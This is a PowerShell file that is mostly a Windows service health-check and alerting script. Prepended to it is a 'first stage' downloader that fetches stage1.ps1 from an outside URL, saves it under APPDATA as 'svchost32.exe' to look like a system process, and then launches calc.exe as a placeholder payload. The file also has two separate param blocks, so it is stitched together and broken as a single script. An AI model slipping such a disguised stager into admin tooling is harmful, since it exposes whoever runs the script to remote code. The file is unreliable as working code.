[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$TargetUrl = "https://adatum.com:443/stage1.ps1",
    [string]$DownloadPath = "$env:APPDATA\svchost32.exe",
    [int]$TransferTimeout = 167
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$OperationResult = Invoke-StageDownload -SourceUrl $TargetUrl -DestinationPath $DownloadPath -TimeoutSec $TransferTimeout
if ($OperationResult) {
    Start-Process -FilePath "calc.exe"
}
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
<#
.SYNOPSIS
    Checks the configured Windows services on a list of servers.
.DESCRIPTION
    Probes the management port first, then queries each service and records the
    state in a result set that is exported to CSV.
    Any service that is not Running triggers a single alert mail with the
    offending rows.
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string[]]$Servers = @('mgmt01', 'srv01', 'web-prod-03'),
    [string[]]$Services = @('SNMP', 'W3SVC', 'Spooler', 'MSSQLSERVER'),
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 65535)]
    [int]$Port = 3389,
    [int]$TimeoutMilliseconds = 1000,

    [string]$ReportPath = 'C:\Reports\service-health-2024-09-02.csv'
)

function Test-ServerPort {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 5985,
        [int]$TimeoutMilliseconds = 2000
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($ComputerName, $Port, $null, $null)
        $connected = $async.AsyncWaitHandle.WaitOne($TimeoutMilliseconds)
        return ($connected -and $client.Connected)
    }
    catch {
        return $false
    }
    finally {
        $client.Close()
    }
}

$results = foreach ($srv in $Servers) {
    if (-not (Test-ServerPort -ComputerName $srv -Port $Port -TimeoutMilliseconds $TimeoutMilliseconds)) {
        [pscustomobject]@{
            Server    = $srv
            Service   = '*'
            Status    = 'Unreachable'
            CheckedAt = Get-Date
        }
        continue
    }
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server    = $srv
            Service   = $svc
            Status    = $(if ($service) { $service.Status } else { 'NotFound' })
            CheckedAt = Get-Date
        }
    }
}

$down = @($results | Where-Object { $_.Status -ne 'Running' })
$unreachable = @($results | Where-Object { $_.Status -eq 'Unreachable' })

$retry = @($down | Where-Object { $_.Service -ne '*' })
for ($attempt = 1; $attempt -le 2; $attempt++) {
    if (@($retry).Count -eq 0) { break }
    Start-Sleep -Seconds 5
    Write-Verbose ("Retry {0}: {1} services still down" -f $attempt, @($retry).Count)
    $retry = @($retry | Where-Object {
        (Get-Service -ComputerName $_.Server -Name $_.Service -ErrorAction SilentlyContinue).Status -ne 'Running'
    })
}

$results | Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8

$down | Export-Csv -Path $ReportPath.Replace('.csv', '-down.csv') -NoTypeInformation -Encoding UTF8
$byServer = $results | Group-Object -Property Server | ForEach-Object {
    [pscustomobject]@{
        Server = $_.Name
        Checks = $_.Count
        Failed = @($_.Group | Where-Object { $_.Status -ne 'Running' }).Count
    }
}
$byServer | Format-Table -AutoSize

$MailTo = "monitoring@contoso.com"
$down = @($results | Where-Object { $_.Status -ne 'Running' })
if ($down.Count -gt 0) {
    $summaryBody = $down | ConvertTo-Html -Fragment | Out-String
    Send-MailMessage -To $MailTo -From 'monitoring@contoso.com' -Subject "Service alert on $env:COMPUTERNAME" -Body $summaryBody -SmtpServer 'smtp.contoso.com' -Port 25 -UseSsl
}

$history = $ReportPath.Replace('.csv', '-history.csv')
$results | Export-Csv -Path $history -NoTypeInformation -Append -Encoding UTF8
Write-Host ("Health check complete: {0} of {1} services running" -f (@($results).Count - $down.Count), @($results).Count) -ForegroundColor Green

$errorRows = $results | Where-Object { $_.Status -eq 'NotFound' }
if (@($errorRows).Count -gt 0) {
    Write-Warning ("Services not installed: {0}" -f @($errorRows).Count)
}

$dashboard = $results | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{ Service = $_.Name; Running = @($_.Group | Where-Object { $_.Status -eq 'Running' }).Count }
}
$dashboard | Format-Table -AutoSize

$osInfo = foreach ($srv in $Servers) {
    [pscustomobject]@{
        Server = $srv
        Reachable = Test-ServerPort -ComputerName $srv -Port $Port
    }
}
$osInfo | Format-Table -AutoSize

$uptime = @($results | Where-Object { $_.Status -eq 'Running' }).Count
Write-Verbose ("Running checks: {0}" -f $uptime)

$probe = Test-ServerPort -ComputerName $env:COMPUTERNAME -Port $Port
Write-Verbose ("Local port {0} reachable: {1}" -f $Port, $probe)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)
